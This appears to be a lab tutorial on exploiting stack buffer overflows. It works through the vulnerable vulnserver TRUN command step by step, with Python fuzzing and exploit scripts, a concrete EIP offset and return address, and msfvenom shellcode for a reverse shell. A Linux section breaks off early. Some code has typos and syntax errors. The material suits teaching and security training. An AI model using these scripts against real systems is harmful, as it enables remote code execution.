#  Buffer Overflow
## 1. Introduction to x86 Arch
### 1.1 Program Memory
![image](https://user-images.githubusercontent.com/43812413/132995755-5f51a287-1012-4dcf-b16d-d7b328e83b2b.png)
- **Stack**: When a thread is running, it execute code from within the Progream Image or from various Dynamic Link Libraries (DLLs). The thread requires a short-term data areas for functions, local variables, and programm control information, which is known as the stack. Each thread has its own stack. Stack memory is viewed by the CPU as a LIFO structure. This means that while accessing the stack, items put on the top of the stack are removed first. The x86 arch implements PUSH and POP assembly instructions in order to add or remove data to the stack respectively
- **Function Return Mechanics**: When code within a thread calls a function, it must know whuch address to return to once the function completes. This "return address" is stored on the stack. This collection of data is associated with one function call and is stored in a section of the stack memory known as a stack frame. When function ends, the return address is taken from the stack and used to restore the execution flow back to the main program of the calling function.
- **CPU Registers**: To perfrorm efficient code execution, the CPU maintains and uses a series of nine 32-bit registers. Registers are small, extremely high-speed CPU storage locations where data can be efficienly read or manipulated. 
- **ESP - The Stack Pointer**: Since the stack is dynamic and changes constantly during program execution, ESP, keeps track of the most recently referenced location on the stack (top of the stack) by storing a pointer to it
- **EBP - The Base Pointer**: Since the stack is in constant flux, it can become difficult for a function to locate its own stack frame, which stores the required arguments, local variables, and the return address. EBP solves this by storing a pointer to the top of the stack when a function is called. By accessing EBP, a function can easily reference information from its own stack frame (via offsets) while executing.
- **EIP - The Instructor Pointer**: EIP, the instructor pointer, is one of the most important registers for Buffer Overlows, as it always points to the next code instruction to be executed. Since EIP essentially directs the flow of a program, it is an attacker's primary target when exploiting any memory corruption vuln.

## 2. Windows Buffer Overlow
### 2.1 Spiking
The test will be done in the vulnerable executable **vulnserver**.
First of all we will open our **Immunity Debugger** as an Administrator, then we will select **File -> Attach**. Once we are in **Attach** we select **vulnserver**:

![image](https://user-images.githubusercontent.com/43812413/132997437-1689629e-0b48-4465-b567-f2936108d58b.png)

We will press **start** ![image](https://user-images.githubusercontent.com/43812413/132997451-0cc4a42f-a8a2-4f7d-9a30-b46940c2826c.png)

We should see *Running* on the bottom.

Then we will go to our **Kali**, and will try to connect with **netcat** to **vulnserver**:

![image](https://user-images.githubusercontent.com/43812413/132997506-cbb43b46-f841-4e27-ae16-74357492a7b7.png)

If we type **HELP** a list of available commands is displaied:

![image](https://user-images.githubusercontent.com/43812413/132997545-a0cbeff8-a2da-4e97-89a2-203766dd3deb.png)

We will focus in **TRUN** command, which is the one vulnerable to BOFs.
The aim of **Spiking** is grab one of that commands, for instance **STATS** and see if there is a possibility that with that command there is a BOF. 
In **Spiking** we will use a tool called **generic_send_tcp**:

![image](https://user-images.githubusercontent.com/43812413/132997692-48c05e2e-8155-4107-affc-725060ac9872.png)

The **spike_script** is as follows:
  1. We create a file called **spike.spk**
  2. We write the next code:
  
  ![image](https://user-images.githubusercontent.com/43812413/132997862-54e3f8e6-2901-4f0a-8166-8eddea427c5a.png)
  
Once we have our **spike_script** we type the following:
```bash
generic_send_tcp 192.168.1.128 9999 spike.spk 0 0
```
When RETURN is pressed, a lot of character will be sent. If the command is vulnerable, in **Immunity Debugger** the programm will stop.
If we abuse the **TRUN** command the next has to happen in **Immunity Debugger**:

![image](https://user-images.githubusercontent.com/43812413/132997921-230378fa-d21a-4c02-b905-ef61d7eee7ab.png)

**Vulnserver** has crashed. The **ESP**, the **EBP** and the **EIP** are filled wit **A's**, this means that we had a BOF.

### 2.2 Fuzzing

For fuzzing we will need to write an script in your favorite programming language. In my case I will write it in Python:
```python
#!/usr/bin/python

import sys, socket
from time import sleep

buffer = 'A' * 100

while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('[VULN_SERVICE_IP]',[VULN_SERVICE_PORT]))
        
        s.send(('TRUN /.:/' + buffer))
        s.close
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print "Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()
```
This script allow us to know approximatelly how many characters we need to induce the BOF.
In the **Spiking** we saw that after *TRUN* there was */.:/*, that's the reason we include it when we send the buffer.
The next step it's execute it:

![image](https://user-images.githubusercontent.com/43812413/133753175-398395e2-da16-4aec-b69e-1b20d6969710.png)

In this example we see that crashed with 2200 characters:

![image](https://user-images.githubusercontent.com/43812413/133753337-2e6dc16f-4c51-4f3e-a8c6-471d43ce4ca9.png)

The **EIP** has not been overwritten, we have to see approximately where we have crashed the programm. The script says that at **2200** bytes, so we will try with **3000** characters and see if the **EIP** is ovrwritten. Once we see that it has been overwritten we will find the **Offset**

### 2.3 Finding the Offset

When we say that we want to found the **Offset**, we are saying that we want to found the EIP's position. We will use a **metasploit** tool called **pattern_create.rb**. The tool is located in **/usr/share/metasploit-frmework/tools/exploit/pattern_create.rb**. 
We will use the **-l** flag to indicate the length of our pattern. As we found out in **Fuzzing**, the length of the pattern has to be **3000**.

![image](https://user-images.githubusercontent.com/43812413/133754835-31ca42c5-ae58-4710-bcf2-a35652510e13.png)

We will modify our previous script:

```python
#!/usr/bin/python

import sys, socket

offset = "[pattern_create_output]"

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('[VULN_SERVICE_IP]',[VULN_SERVICE_PORT]))
    s.send(('TRUN /.:/' + offset))
    s.close
    
except:
    print "Error connecting to the server"
    sys.exit()
```

Once the scrip is executed, we will see the **EIP** value in **Immunity Debugger**.:

![image](https://user-images.githubusercontent.com/43812413/133755854-b2a8b8bc-c193-4c8b-8ea6-947de4218416.png)

The EIP's value has to be copied and passed to **/usr/share/metasploit-framework/tools/exploit/pattern_offset**
We will use **-l** (to indicate the used pattern's length) and **-q** (to indicate the **EIP's** value):

![image](https://user-images.githubusercontent.com/43812413/133756281-aa42661c-a0c6-4d66-92d0-fcd37ec54b4a.png)

We already havce the offset value, which means that we now that from 2003 bytes we can controll de **EIP**

### 2.4 Overwritting the EIP

We know that the **offset** is 2003 bytes.
The **EIP** has a length of 4 bytes, we will try to overwrite it with the next script:
```python
#!/usr/bin/python

import sys, socket
filler = "A" * 2003  #Where 2003 is placed has to be our offset
eip = "B" * 4
buffer = "D" * (3000 - len(filler) - len(eip))
shellcode = filler + eip  + buffer

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('[VULN_SERVICE_IP]',[VULN_SERVICE_PORT]))
    s.send(('TRUN /.:/' + shellcode))
    s.close

exept:
    print "Error connecting to the server"
    sys.exit()
```
Once executed the script we should see the **EIP** filled with **Bs**:

![image](https://user-images.githubusercontent.com/43812413/133758715-ec703049-0bf1-46b1-9971-c62e1812ad5a.png)

### 2.5 Finding Bad Characters

Are some characters that are used for specific instructions inside the programm, for this reason we have to avoid to use them in our shellcode.
First we will the list (https://github.com/cytopia/badchars)

Then we will use the previous script with some modifications:
```python
#!/usr/bin/python

badchars = ( "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

filler = "A" * 2003  #Where 2003 is placed has to be our offset
eip = "B" * 4
shellcode = filler + eip + badchars


try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('[VULN_SERVICE_IP]',[VULN_SERVICE_PORT]))
    s.send(('TRUN /.:/' + shellcode))
    s.close

exept:
    print "Error connecting to the server"
    sys.exit()
```

Once executed, we have to go to **Immunity Debugger** and take a look to **Hex_Dump**. To go to the position where the **ESP** starts, we right click to its number and select **Follow in Dump**. We should see something like this:

![image](https://user-images.githubusercontent.com/43812413/133760772-7c017d33-6ffc-41b3-97b3-143cfe66b73c.png)

In the example there is not any bad char, but in case we found one (it's found when the sequence is broken), we should erase it from the *badchars* variable and run the script again

### 2.6 Finding the Right Module

When we talk about find a module, we mean to find places without memory protection. There is a tool called **[mona modules**](https://github.com/corelan/mona). 
We will put **mona.py** in **C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands**.
In the command line that is at the bottom of **Immunity Debugger** we will write **!mona modules**, **Immunity Debbuger** has to be Paused.

![image](https://user-images.githubusercontent.com/43812413/133762545-f416660e-9e6e-4945-b9c4-e897fd0af678.png)

Where we see *True/Fals* are the **Protection Settings** We are looking for one linked to **vulnserver** as can be the first one. So our candidate is **esssfunc.dll**. It can't be **vulnserver.exe** as all it's memory addresses contains **Bad Characters**

Now we will use **nasm_shell** in **Kali**. This is located at **/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb**
This tool give us the hexadecimal encoding of an intruction. We are interested in **JMP ESP**, which will allow us to execute our shellcode.

![image](https://user-images.githubusercontent.com/43812413/133763674-58c260c7-52e9-47a8-8495-a84e026e935f.png)

The equivalent is **FFE4**.
In **Immunity Debugger** we write **!mona find -s '\xff\xe4' -m essfunc.dll**

![image](https://user-images.githubusercontent.com/43812413/133764036-f844bea0-a595-45b6-b316-e910f7bd59bd.png)


We are looking for **JMP EIP** instructrions' memory address linked to **esssfunc.dll's**. For the example we will choose the memory address *0x625011af*.
With this information we can edit our script:
```python
#!/usr/bin/python

import sys, socket

shellcode = "A"*2003 + "\xaf\x11\x50\x62" #We have to put this backwards because of Little Endian

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('[VULN_SERVICE_IP]',[VULN_SERVICE_PORT]))
    s.send(('TRUN /.:/' + shellcode))
    s.close
    
except:
    print "Error connecting to the server"
    sys.exit()
```
In **Immunity Debugger** we click 
![image](https://user-images.githubusercontent.com/43812413/133765324-7971bb65-8e7c-4956-965c-f3a3933ced2e.png)
and search **625011af**. The memory address of our **JMP EIP** will be diplayed.
We will click **F2** to put a **Break Point** there:

![image](https://user-images.githubusercontent.com/43812413/133765708-64641b78-6fcb-4f95-95cc-704f2658e4c6.png)

We select **Play** and then we execute our **script**. We should see the memory address of our **JMP ESP** in the **EIP** value:

![image](https://user-images.githubusercontent.com/43812413/133765954-568f2211-630e-4370-96ce-ace0deb7bbf7.png)


### 2.7 Generating Shellcode and Getting Root

We will go to **Kali** and use **msfvenom** to generate our shellcode.
The -f (for the format), -a (for the architecture) and -b (for specify the bad charachters) flags will be used:

![image](https://user-images.githubusercontent.com/43812413/133767470-9b8bfe26-75a6-40c7-bc46-b5bac4ec5bd8.png)

We copy the variable and paste it in our script as overflow:

```python
#!/usr/bin/python

import sys, socket
overflow = ("\xdb\xc6\.....")
shellcode = "A"*2003 + "\xaf\x11\x50\x62" + '\x90'*32 + overflow #The \x90*32 is the Padding

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('[VULN_SERVICE_IP]',[VULN_SERVICE_PORT]))
    s.send(('TRUN /.:/' + shellcode))
    s.close
    
except:
    print "Error connecting to the server"
    sys.exit()
```

We open a **listener** with **netcat** at port 4444 and execute the script.


## 3. Linux Buffer Overfow
The BOF will be made on [*VulnServer-Linux*](https://github.com/ins1gn1a/VulnServer-Linux).
In order to debug the application we will use the *Evans Debugger* (**EDB**).

First of all we will execute the application:

![image](https://user-images.githubusercontent.com/43812413/133784932-289e7059-c5d7-4d3d-9bc7-ed063c05a3e1.png)

Then we will execute **EDB**:

![image](https://user-images.githubusercontent.com/43812413/133785225-4aa672ab-c6e9-42c9-a557-e6e8f7b0c219.png)

![image](https://user-images.githubusercontent.com/43812413/133785267-55a81044-cff2-4c28-b807-8411626cf9cd.png)

We will use *Attach* from *File* menu and select the vulnerable application.
Once attached we should see something like this:

![image](https://user-images.githubusercontent.com/43812413/133785799-9adcfd2d-b5b1-42fd-96cb-c9ae82f14d06.png)

The application will stop once is attached, we have to press the button *Run* (sometimes twice).

### 3.1 Spiking
The first phase is the vulnerable part.
If we connect to the server we see the next:

![image](https://user-images.githubusercontent.com/43812413/133797778-bfe07a20-1d62-4676-b921-9363966ce9c3.png)

If we type *HELP* the next is displayed:

![image](https://user-images.githubusercontent.com/43812413/133797909-b7821668-070a-4080-91e4-c28b177fa871.png)

None of the commands accept input, so the vulnerability has yo be in the only input available.

We will use **generi_send_tcp** to see if it's vulnerable to BOF:

![image](https://user-images.githubusercontent.com/43812413/133798290-ce9db452-5916-4ee4-8298-e649276e6ae9.png)






